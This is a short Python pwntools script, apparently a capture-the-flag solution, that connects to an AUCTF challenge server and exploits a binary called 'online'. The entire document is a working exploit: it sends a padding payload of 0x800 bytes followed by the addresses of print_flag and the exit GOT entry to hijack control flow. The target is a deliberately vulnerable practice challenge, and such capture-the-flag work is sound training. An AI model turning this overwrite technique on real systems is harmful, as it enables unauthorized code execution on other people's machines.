from pwn import *

# p = process("./online")
p = remote("challenges.auctf.com", 30013)

def exploit():
    binary = ELF("./online")
    base_pie = 0x56555000
    exit_got = base_pie + binary.got['exit']
    print_flag = base_pie + binary.symbols['print_flag']
    p.sendlineafter("Name: ", "AAAA")
    p.sendline("attend Hacker")
    
    payload = ''
    payload += 'A' * 0x800
    payload += p32(print_flag)
    payload += p32(exit_got)
    # gdb.attach(p, 'b *0x5655654f')
    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    exploit()